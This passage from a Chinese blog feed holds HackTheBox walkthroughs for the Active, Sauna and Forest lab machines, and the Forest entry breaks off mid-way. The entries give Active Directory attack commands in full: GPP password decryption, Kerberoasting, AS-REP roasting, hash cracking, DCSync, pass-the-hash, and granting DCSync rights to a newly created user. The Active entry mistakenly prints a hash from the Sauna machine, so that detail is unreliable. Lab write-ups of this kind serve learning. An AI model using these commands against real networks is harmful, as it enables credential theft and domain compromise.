    <summary type="html">HackTheBox篇域渗透系列之Blackfield</summary>
    
    
    
    <category term="HackTheBox" scheme="https://www.fomal.cc/categories/HackTheBox/"/>
    
    
    <category term="HTB" scheme="https://www.fomal.cc/tags/HTB/"/>
    
    <category term="域渗透" scheme="https://www.fomal.cc/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Active</title>
    <link href="https://www.fomal.cc/posts/79fbfa03.html"/>
    <id>https://www.fomal.cc/posts/79fbfa03.html</id>
    <published>2024-07-05T01:38:14.000Z</published>
    <updated>2024-10-12T11:01:24.681Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.10.100</p><p>攻击机ip：10.10.14.12</p></blockquote><h1>知识点</h1><ul><li>组策略安全问题</li><li>Kerberoasting攻击</li><li>smbclient工具使用</li></ul><h1>信息收集</h1><h2 id="nmap扫描">nmap扫描</h2><p><code>nmap -sS -sV -sC 10.10.10.100</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708130024551-1884352902.png" alt="image-20240708130022178"></p><p>发现有<code>kerberos</code>服务，<code>smb</code>服务，<code>ldap</code>服务，域名为 <code>active.htb</code></p><h2 id="SMB">SMB</h2><p><code>smbclient -L \\10.10.10.100</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708131335828-1229634342.png" alt="image-20240708131333628"></p><p>发现匿名登陆成功，并得到一些可以访问的共享资源，进一步探测</p><p><code>smbmap -H 10.10.10.100</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708134451917-1771966004.png" alt="image-20240708134449415"></p><p>可以看到匿名用户对 <code>Replication</code> 文件夹具有 <code>READ ONLY</code> 权限，尝试访问</p><p><code>smbclient //10.10.10.100/Replication</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708135139603-190151919.png" alt="image-20240708135137253"></p><h1>组策略GPP密码解密</h1><blockquote><p>当创建新的组策略首选项（GPP）时，在 C:\Windows\SYSVOL 中会创建一个与相关配置数据相关联的XML文件，其中包括与 GPP 关联的任何密码。为了安全起见，Microsoft AES 在将密码存储为 cpassword 但随后微软在 MSDN 上发布了密钥。<br>由于经过身份验证的用户（任何域用户或受信任域中的用户）都具有对SYSVOL的读取权限，所以域中的任何人都可以搜索包含“cpassword”的XML文件的SYSVOL共享，该文件是包含AES加密密码的值。</p><p>所有域组策略都存储在：\ SYSVOL \ Policies \</p></blockquote><p>使用<code>smbclient</code>尝试访问该目录的文件，最后在<code>\active.htb\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\Groups\</code>目录下发现<code>Groups.xml</code>文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708141318506-1037427827.png" alt="image-20240708141316123"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708141329701-245755982.png" alt="image-20240708141327727"></p><p>可以拿到一对用户名和<code>GPP</code>密码</p><p><code>active.htb\SVC_TGS : edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</code></p><p>由于密钥是已知的，我们可以使用<code>Kali</code>上的工具<code>gpp-decrypt</code>来解密</p><p><code>gpp-decrypt &quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708142501970-1727130224.png" alt="image-20240708142457314"></p><blockquote><p>active.htb\SVC_TGS</p><p>GPPstillStandingStrong2k18</p></blockquote><p>现在我们拿到了一个域用户的账号和明文密码，接下来我们再来尝试通过<code>SMB</code>登录</p><p><code>smbclient //10.10.10.100/Users -U SVC_TGS</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708144846574-1126980413.png" alt="image-20240708144844053"></p><p>最后在<code>SVC_TGS</code>用户的<code>Desktop</code>得到<code>user.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708144937195-1629946426.png" alt="image-20240708144935287"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708144943344-1994666938.png" alt="image-20240708144941529"></p><h1>kerberoasting攻击</h1><blockquote><p>攻击原理：</p><p>​<code>Kerberoasting</code> 是流行的 <code>AD Kerberos</code> 攻击之一，Kerberoasting 是一种允许攻击者窃取使用 RC4 加密的 <code>KRB_TGS</code> 票证的技术，以暴力破解应用程序服务哈希以提取其密码。  在此攻击中，从<code>Active Directory</code>中提取服务帐户的凭据哈希并离线破解。我们需要确定哪些帐户是<code>kerberoastable</code>，然后作为经过身份验证的用户，我们可以为目标服务帐户请求服务票证  (TGS)，而无需向运行服务的目标服务器发送任何流量。</p></blockquote><p>如下图所示，<code>kerberoasting</code> 的重点是向 <code>KDC</code> 请求 <code>TGS</code>。此攻击仅涉及突出显示的步骤 3 和 4。</p><p><img src="https://rootdse.org/assets/images/0006-active-directory-security-2/kerberoasting_flow.png" alt="Kerberos Authentication flow)"></p><p>可以使用<code>Impacket</code> 中的脚本<code>GetUserSPNs.py</code>来获取与<code>SVC_TGS</code>用户帐户相关联的服务的用户名列表</p><p><code>python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708151704422-1431746945.png" alt="image-20240708151701799"></p><p>这样就拿到了一张管理员服务票据（TGS）</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:58bdf4fa347723cb982bdcc37337eb8d$44fdc778d8e0f2346c7d67f5ea08324f2b3db42ec4726705e8c2b13a7bb234f5fcec23542121d7a837f4e9d4cc698f8572eb2e9ba53497d2cffd9d12a25d8db80a52e1d5547344805a85fd9d27ba14fae2dc53467ab6f41887439fde483e0506e3529190a22172243fb9bbece3c21e0f95034100c96a824c57772ee81729d53c699dd9c30c9bf130b33429af8f08aa7c54da5f6d651966bd2235a601c489c9ba37a3ae4d9a9e8166ab978bfa71ee4e4b1d22c6d7a24a6257f2a9302dfc5afc1ccb326a9904bed9f492f3dcae0e68080d7a4a8d0aa2e13a7cf2a4a14982d55cea5d844180e1b1adb490c2f792ea3fb9f4196f23f0f72fe50982c991b0064be0b7</span><br></pre></td></tr></table></figure><p>使用<code>john</code>破解</p><p>将上述票据保存为<code>hash</code>，使用<code>john</code>爆破<code>hash</code>值</p><p><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p><code>john hash -show</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240708153350228-1991754535.png" alt="image-20240708153348021"></p><p><code>Ticketmaster1968</code></p><p>通过<code>smbclient</code>登录<code>administrator</code></p><p><code>smbclient -U administrator //10.10.10.100/Users</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240709090439214-1141233570.png" alt="image-20240709090438584"></p><p>最后在<code>Desktop</code>目录拿到<code>root.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240709090433888-136269028.png" alt="image-20240709090433121"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240709090426341-1460306309.png" alt="image-20240709090425370"></p>]]></content>
    
    
    <summary type="html">HackTheBox篇域渗透系列之Active</summary>
    
    
    
    <category term="HackTheBox" scheme="https://www.fomal.cc/categories/HackTheBox/"/>
    
    
    <category term="HTB" scheme="https://www.fomal.cc/tags/HTB/"/>
    
    <category term="域渗透" scheme="https://www.fomal.cc/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Sauna</title>
    <link href="https://www.fomal.cc/posts/5551a214.html"/>
    <id>https://www.fomal.cc/posts/5551a214.html</id>
    <published>2024-07-02T05:42:59.000Z</published>
    <updated>2024-10-12T11:01:29.525Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.10.175</p><p>攻击机ip：10.10.14.13</p></blockquote><h1>知识点</h1><ul><li>AS-REP Roasting</li><li>BloodHound信息搜集</li><li>DCSync提权</li><li>PTH传递攻击</li></ul><h1>信息收集</h1><h2 id="nmap扫描">nmap扫描</h2><p>nmap扫一下</p><p><code>nmap -sS -sV -sC 10.10.10.175</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240705135044409-1259975882.png" alt="image-20240705135030653"></p><p>发现有<code>web</code>服务，<code>DNS</code>服务，<code>Kerberos</code>服务，<code>smb</code>共享服务，<code>RPC</code>服务，<code>LDAP</code>服务，有AD域</p><p>得到一个域名<code>EGOTISTICAL-BANK.LOCAL</code></p><p>先简单测试一下</p><h2 id="SMB">SMB</h2><p>尝试匿名登录SMB服务</p><p><code>smbclient -N -L \\10.10.10.175</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240705140443576-595990783.png" alt="image-20240705140430156"></p><p>匿名登陆成功，但是并无重要信息</p><h2 id="LDAP">LDAP</h2><p>尝试使用ldapsearch工具尝试获取域中的用户，根据之前得到的域名<code>EGOTISTICAL-BANK.LOCAL</code>构造如下命令</p><p><code>ldapsearch -x -H ldap://10.10.10.175  -b &quot;dc=Egotistical-bank,dc=local&quot; | grep &quot;dn:&quot;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240705141252587-707688598.png" alt="image-20240705141239128"></p><p>获取到一个可能叫做<code>Hugo Smith</code>的用户</p><h2 id="RPC">RPC</h2><p>尝试<code>RPC</code>空账号登录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240705141727490-1030070414.png" alt="image-20240705141714174"></p><p><code>RPC</code>拒绝连接</p><h2 id="WEB">WEB</h2><p>在页面中，找到如下姓名</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240705141529895-1920992009.png" alt="image-20240705141516397"></p><blockquote><p>Fergus Smith</p><p>Shaun Coins</p><p>Hugo Bear</p><p>Steven Kerb</p><p>Bowie Taylor</p><p>Sophie Driver</p></blockquote><h2 id="kerbrute用户名枚举">kerbrute用户名枚举</h2><p>尝试通过<code>kerbrute</code>列出使用者，字典使用的是<code>seclists</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kerbrute_linux_amd64 userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240705154300732-2114639653.png" alt="image-20240705154247314"></p><p>可以看到有<code>hsmith</code>和<code>fsmith</code>用户</p><h1>AS-REP Roasting</h1><p>将两个用户名保存到<code>user.txt</code>，尝试一下<code>AS-REP Roasting</code>攻击</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile user.txt  -dc-ip 10.10.10.175</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240705165616305-146200250.png" alt="image-20240705165602974"></p><p>拿到<code>fsmith</code>用户的<code>hash</code></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:58bdf4fa347723cb982bdcc37337eb8d$44fdc778d8e0f2346c7d67f5ea08324f2b3db42ec4726705e8c2b13a7bb234f5fcec23542121d7a837f4e9d4cc698f8572eb2e9ba53497d2cffd9d12a25d8db80a52e1d5547344805a85fd9d27ba14fae2dc53467ab6f41887439fde483e0506e3529190a22172243fb9bbece3c21e0f95034100c96a824c57772ee81729d53c699dd9c30c9bf130b33429af8f08aa7c54da5f6d651966bd2235a601c489c9ba37a3ae4d9a9e8166ab978bfa71ee4e4b1d22c6d7a24a6257f2a9302dfc5afc1ccb326a9904bed9f492f3dcae0e68080d7a4a8d0aa2e13a7cf2a4a14982d55cea5d844180e1b1adb490c2f792ea3fb9f4196f23f0f72fe50982c991b0064be0b7</span><br></pre></td></tr></table></figure><p>使用<code>john</code>破解</p><p>将上述票据保存为<code>hash</code>，使用<code>john</code>爆破<code>hash</code>值</p><p><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p><code>john hash -show</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240705170725588-1732545966.png" alt="image-20240705170711853"></p><p>拿到<code>fsmith</code>的凭证<code>fsmith:Thestrokes23</code></p><p>尝试远程登陆</p><p><code>evil-winrm -i 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240705171004310-183933394.png" alt="image-20240705170949902"></p><p>登录成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240705171705037-1061082570.png" alt="image-20240705171651372"></p><p>最后在桌面上拿到<code>user.txt</code></p><h1>注册表获取用户密码</h1><p>在<code>Users</code>目录下发现新用户<code>svc_loanmgr</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240706125236729-1214413985.png" alt="image-20240706125235716"></p><p>通过查询<code>Winlogon</code>注册表来手动收集信息</p><p><code>reg.exe query &quot;HKLM\software\microsoft\windows nt\currentversion\winlogon&quot;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240706130913738-871033410.png" alt="image-20240706130910599"></p><p>拿到用户名密码<code>svc_loanmanager : Moneymakestheworldgoround!</code></p><p>但是通过登录发现<code>svc_loanmanager </code>登不上，登录<code>svc_loanmgr</code>登陆成功</p><h1>AD域渗透权限提升</h1><h2 id="BloodHound信息搜集">BloodHound信息搜集</h2><p>登录<code>svc_loanmgr</code>用户</p><p><code>evil-winrm -i 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'</code></p><p>接下来使用<code>bloodhound</code>进行信息搜集</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">upload /root/htb/Machines/Sauna/SharpHound.exe</span><br><span class="line">./SharpHound.exe</span><br><span class="line">download 20240706064043_BloodHound.zip</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240706151303740-1966923458.png" alt="image-20240706151302995"></p><p>分析发现可以利用<code>DCSync</code>攻击直接域控</p><h2 id="DCSync提权">DCSync提权</h2><p>使用<code>secretsdump.py</code>工具执行 <code>DCSync</code> 以转储管理员用户的 <code>NTLM</code> 哈希</p><p><code>python3 /usr/share/doc/python3-impacket/examples/secretsdump.py svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240706151914385-627492788.png" alt="image-20240706151913724"></p><p>可以看到已经拿到所有用户的<code>hash</code>，包括<code>admin</code>用户的</p><h2 id="PTH传递攻击获取Root">PTH传递攻击获取Root</h2><p>拿到了管理员的<code>hash</code>，就可以通过<code>wmiexec</code>哈希传递拿到管理员用户的权限</p><p><code>python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e EGOTISTICAL-BANK.LOCAL/administrator@10.10.10.175</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240706152200125-1504201946.png" alt="image-20240706152159481"></p><p>成功拿到管理员用户的权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240706152456281-1524121811.png" alt="image-20240706152455683"></p><p>最后在<code>desktop</code>获取<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">HackTheBox篇域渗透系列之Sauna</summary>
    
    
    
    <category term="HackTheBox" scheme="https://www.fomal.cc/categories/HackTheBox/"/>
    
    
    <category term="HTB" scheme="https://www.fomal.cc/tags/HTB/"/>
    
    <category term="域渗透" scheme="https://www.fomal.cc/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Forest</title>
    <link href="https://www.fomal.cc/posts/1bc19c16.html"/>
    <id>https://www.fomal.cc/posts/1bc19c16.html</id>
    <published>2024-06-27T12:12:35.000Z</published>
    <updated>2024-10-12T11:01:37.333Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.10.161</p><p>攻击机ip：10.10.14.13</p></blockquote><h1>知识点</h1><ul><li>AD域渗透提取</li><li>HoundBlood使用</li><li>AS-REP Roasting攻击</li><li>Hash爆破</li><li>PTH传递攻击</li><li>滥用DCSync</li></ul><h1>信息收集</h1><h2 id="nmap扫描">nmap扫描</h2><p>拿namp扫一下</p><p><code>nmap -sS -sV -sC 10.10.10.161</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240702183037029-68856069.png" alt="image-20240702183019354"></p><p>发现存在系统<code>Windows Server 2016</code>，有<code>DNS</code>服务，<code>Kerberos</code>服务，<code>smb</code>共享服务，<code>RPC</code>服务，无web页面，只有AD域</p><p>先将域名加到配置文件中</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;10.10.10.161  htb.local&quot;</span> &gt;&gt; /etc/hosts</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;10.10.10.161  forest.htb.local&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><blockquote><p>Domain: htb.local</p><p>workgroup: HTB</p></blockquote><h2 id="SMB">SMB</h2><p>尝试匿名登录SMB服务</p><p><code>smbclient -L \\10.10.10.161</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240702183130828-1497766679.png" alt="image-20240702183114049"></p><p>也是没有什么重要信息</p><h2 id="LDAP">LDAP</h2><p>尝试使用ldapsearch工具尝试获取域中的用户列表，根据之前得到的域名<code>htb.local</code>构造如下命令：</p><p><code>ldapsearch -H ldap://10.10.10.161:389 -x -b &quot;CN=users,DC=htb,DC=local&quot;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240702192629104-1904357355.png" alt="image-20240702192626662"></p><p>也没什么重要的信息</p><h2 id="RPC">RPC</h2><p>利用RPC远程过程调用枚举用户</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿DESKTOP-K196DPF)-[~/MyFile]</span><br><span class="line">└─<span class="comment"># rpcclient -U &quot;&quot; -N 10.10.10.161</span></span><br><span class="line">rpcclient $&gt; enumdomusers</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240702193458453-2004846275.png" alt="image-20240702193457026"></p><p>先将用户名整理出来</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">krbtgt</span><br><span class="line">DefaultAccount</span><br><span class="line">$331000-VK4ADACQNUCA</span><br><span class="line">SM_2c8eef0a09b545acb</span><br><span class="line">SM_ca8c2ed5bdab4dc9b</span><br><span class="line">SM_75a538d3025e4db9a</span><br><span class="line">SM_681f53d4942840e18</span><br><span class="line">SM_1b41c9286325456bb</span><br><span class="line">SM_9b69f1b9d2cc45549</span><br><span class="line">SM_c75ee099d0a64c91b</span><br><span class="line">SM_1ffab36a2f5f479cb</span><br><span class="line">HealthMailboxc3d7722</span><br><span class="line">HealthMailboxfc9daad</span><br><span class="line">HealthMailboxc0a90c9</span><br><span class="line">HealthMailbox670628e</span><br><span class="line">HealthMailbox968e74d</span><br><span class="line">HealthMailbox6ded678</span><br><span class="line">HealthMailbox83d6781</span><br><span class="line">HealthMailboxfd87238</span><br><span class="line">HealthMailboxb01ac64</span><br><span class="line">HealthMailbox7108a4e</span><br><span class="line">HealthMailbox0659cc1</span><br><span class="line">sebastien</span><br><span class="line">lucinda</span><br><span class="line">svc-alfresco</span><br><span class="line">andy</span><br><span class="line">mark</span><br><span class="line">santi</span><br></pre></td></tr></table></figure><h1>AS-REP Roasting</h1><p>拿到了用户名，这里又暴露了<code>kerberos</code>端口88。尝试一下<code>AS-REP Roasting</code>攻击。</p><p>将上面的用户名保存为<code>user.txt</code>文件，使用<code>GetNPUsers.py</code>尝试向<code>kerberos</code>请求不需要预认证的票据</p><p><code>python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py htb.loacl/ -usersfile user.txt  -dc-ip 10.10.10.161</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240702195600622-2128859699.png" alt="image-20240702195558839"></p><p>拿到了一个<code>svc-alfresco</code>用户的不需要预认证的票据<code>hash</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5asrep$23$svc-alfresco@HTB.LOCAL:ebdb0e07d33fac124f8f2366a628920c$fbfa4eaefaece3b6ac1f461570a97940f59e4551f620e061054800b9ce7ae9f86f5b711ef4579b3f9ff2706ab69ad3077ad1e4c81d246d7e83a029dff3837b8452ab50cab25aa6b528dce9584fbb87a37cb3589d09baf8a5e0e4f7e500a53c95772701bc45bca89bfacb2602c9192a121f70346f9436869c60b66573c8f0fbf05a36319686fec69cb54a04e311558fcc6790501776b4b1288ee55489e57131aeb4d944ed3769ccf5a26ff4e4cd418657afc6bd827d874faccde4c4dbbd194eba15ef470c69b39099751446310f18d5f800bc8d38c1f8a2b28064fecc963757f6e583d2afdd87</span><br></pre></td></tr></table></figure><p>使用<code>john</code>进行破解</p><p>将上述票据保存为<code>hash</code>，使用<code>john</code>爆破<code>hash</code>值</p><p><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p><code>john hash -show</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240702201408699-1289370632.png" alt="image-20240702201407967"></p><p>拿到一个凭证：<code>svc-alfresco : s3rvice</code></p><p>使用<code>evil-winrm</code>远程连接</p><p><code>evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240702202206726-73303224.png" alt="image-20240702202205425"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240704113818861-542849522.png" alt="image-20240704113809977"></p><p>最后在桌面上拿到<code>user.txt</code></p><h1>AD域渗透权限提升</h1><h2 id="BloodHound信息搜集">BloodHound信息搜集</h2><p><code>windows</code>权限提升有一款工具叫做<code>BloodHound</code></p><p>这里使用的是kali的<code>BloodHound</code>工具</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先启动 neo4j</span></span><br><span class="line">neo4j start <span class="comment"># 访问网址默认用户名和密码都是neo4j，登入后修改密码即可</span></span><br><span class="line"><span class="comment"># 再启动 BloodHound</span></span><br><span class="line">bloodhound</span><br><span class="line"><span class="comment"># 输入用户名和修改后的密码即可登录</span></span><br></pre></td></tr></table></figure><p><code>SharpHound.exe</code>下载链接：<a href="https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors">https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors</a></p><p>将<code>SharpHound.exe</code>上传到目标机器并运行，即可得到一个zip文件，该文件里面就是信息搜集的结果，将它下载到本地</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">upload /root/htb/Machines/forest/SharpHound.exe</span><br><span class="line">./SharpHound.exe</span><br><span class="line">download 20240703005056_BloodHound.zip</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240703154602854-406882194.png" alt="image-20240703154557962"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240703154612998-402889656.png" alt="image-20240703154608670"></p><p>登录到Bloodhound，点击右边上传按钮，将解压后的<code>json</code>文件提交上传</p><p>我们查找一下我们已有用户<code>svc-alfresco</code>相关信息</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240703155415163-444323121.png" alt="image-20240703155410634"></p><h2 id="信息分析">信息分析</h2><p>点击左侧<code>Unrolled Group Membership</code>可以发现与其相关的用户组和用户</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240703163424801-1273724818.png" alt="image-20240703163420335"></p><p>重点看下半部分</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240703163326843-375757956.png" alt="image-20240703163322390"></p><p>可以发现<code>svc-alfresco</code>用户属于<code>Account Operators</code>组，该组是AD域中的特权组之一，该组的成员可以创建和管理该域中的用户和组并为其设置权限，也可以在本地登录域控制器。 但是，不能更改属于<code>Administrators</code>或<code>Domain Admins</code>组的账号，也不能更改这些组。</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240703170207796-1894446677.png" alt="image-20240703170202999"></p><p>点击<code>Find Shortest Paths to Domain Admins</code>可以看到上图结果</p><p>其中，从<code>svc-alfresco</code>到<code>Domain Admins </code>的路径中发现，<code>EXCHANGE WINDOWS PERMISSIONS</code>组与<code>Account Operators</code> 组有<code>GenericAll</code>关系，表示<code>EXCHANGE WINDOWS PERMISSIONS</code>组完全信任<code>Account Operators</code> 组，而上面还提到<code>svc-alfresco</code>用户属于<code>Account Operators</code>组，且<code>Account Operators</code>组的成员可以创建和管理该域中的用户和组并为其设置权限，因此我们可以利用<code>Account Operators</code>组的权限创建一个新用户，将其添加到<code>EXCHANGE WINDOWS PERMISSIONS</code>组，同时可以看到<code>EXCHANGE WINDOWS PERMISSIONS</code>组的成员对<code>HTB.LOCAL</code>有<code>WriteDacl</code>权限，可以用新添加的用户对<code>HTB.LOCAL</code>的<code>WriteDacl</code>权限进行恶意利用，从而实现提权</p><h2 id="创建一个恶意用户">创建一个恶意用户</h2><p>回到<code>Evil-WinRM</code>，先利用<code>ACCOUNT OPERATION</code>的权限去创建一个新的用户</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user popayw 123abc! /add /domain<span class="comment"># 创建用户</span></span><br><span class="line">net group <span class="string">&quot;Exchange Windows Permissions&quot;</span> popayw /add<span class="comment"># 将用户添加到Exchange Windows Permissions组</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240705131624984-738117392.png" alt="image-20240705131611080"></p><p>用户创建完毕，再利用<code>WriteDacl</code>权限去给我们用户所在组加权限，这里使用<code>PowerSploit</code>中的<code>powerview.ps1</code>来滥用<code>WriteDacl</code>权限，通过<code>upload</code>将<code>powerview.ps1</code>文件传进去</p><p>运行命令导入脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. .\PowerView.ps1</span><br></pre></td></tr></table></figure><p>这时候就会发现运行<code>menu</code>模块增加</p><ul><li>运行之前</li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240704140311010-817859956.png" alt="image-20240704140302757"></p><ul><li>运行之后</li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240704140329286-337456579.png" alt="image-20240704140320314"></p><p>再定义两个变量，用于创建凭证对象并授予 <code>DCSync</code> 权限，其中<code>Add-DomainObjectAcl</code>模块可以添加<code>DCSync</code>权限</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pass</span> = convertto-securestring <span class="string">&#x27;123abc!&#x27;</span> -AsPlainText -Force</span><br><span class="line"><span class="variable">$cred</span> = New-Object System.Management.Automation.PSCredential (<span class="string">&#x27;HTB\popayw&#x27;</span>, <span class="variable">$pass</span>)</span><br><span class="line">Add-DomainObjectAcl -Credential <span class="variable">$cred</span> -TargetIdentity <span class="string">&quot;DC=htb,DC=local&quot;</span> -PrincipalIdentity popayw -Rights DCSync</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240704142421132-450044665.png" alt="image-20240704142412881"></p><h2 